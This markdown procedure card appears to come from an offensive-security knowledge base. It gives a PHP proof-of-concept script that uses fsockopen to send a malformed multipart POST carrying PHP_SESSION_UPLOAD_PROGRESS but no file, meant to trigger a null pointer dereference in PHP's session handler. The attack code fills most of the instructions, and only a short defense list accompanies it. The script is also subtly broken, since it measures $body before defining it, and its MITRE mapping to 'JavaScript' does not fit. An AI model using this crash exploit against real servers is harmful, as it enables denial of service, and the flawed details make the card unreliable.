---
id: proc-php-prepare-poc-001
tags:
  - php
  - poc
  - multipart-request
type: procedure
tools:
  - '[[tools/fsockopen]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T05:32:09.956Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Prepare-Malformed-Multipart-Request-PoC

## Summary

This procedure creates a PHP PoC script that constructs a crafted multipart/form-data POST request including PHP_SESSION_UPLOAD_PROGRESS but omitting file data to avoid triggering MULTIPART_EVENT_FILE_START, setting up for the null pointer dereference.

## Description

By sending a POST to /index.php with fields like PHPSESSID and PHP_SESSION_UPLOAD_PROGRESS but no actual file upload, the session handler in session.c fails to initialize progress->data (allocated via ecalloc but not set), leading to a null dereference in MULTIPART_EVENT_END when SEPARATE_ARRAY is called. The PoC uses fsockopen for raw socket communication and a specific boundary.

## Requirements

1. PHP interpreter available
2. Knowledge of HTTP multipart format
3. Target server running on localhost:8000

## Defense

Defensive measures and detection strategies:

- Validate all multipart requests for complete file structures
- Log anomalous upload progress sessions
- Restrict session.upload_progress to trusted endpoints

## Objectives

1. Generate a request that skips file start events
2. Include progress tracking name without data
3. Prepare script for socket-based transmission

## Instructions

### Step 1: Write PoC Script Structure

**Context**: Define the HTTP POST headers and body in poc.php, using boundary ---------------------------2020.

**Command** (Manual file creation):
```php
<?php
$fp = fsockopen('localhost', 8000);
$request = "POST /index.php HTTP/1.1\r\n";
$request .= "Host: localhost:8000\r\n";
$request .= "Content-Type: multipart/form-data; boundary=---------------------------2020\r\n";
$request .= "Cookie: PHPSESSID=abc123\r\n";
$request .= "Content-Length: " . strlen($body) . "\r\n\r\n";
$request .= $body; // Body with PHP_SESSION_UPLOAD_PROGRESS but no file
fwrite($fp, $request);
$response = fread($fp, 1024);
var_dump($response);
?>
```

> Builds the request string. Expected output: Valid PHP syntax check with php -l poc.php.

### Step 2: Define Malformed Body

**Context**: Construct the multipart body without file parts to leave data uninitialized.

**Command** (Inline in script):
```php
$body = "-----------------------------2020\r\n";
$body .= "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"; filename=\"\"\n";
$body .= "Content-Type: application/octet-stream\r\n\r\n";
$body .= "-----------------------------2020--\r\n";
```

> Ensures no file start event. Expected output: Body string ready for transmission.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/fsockopen]]

## Tags

- php
- poc
- multipart-request
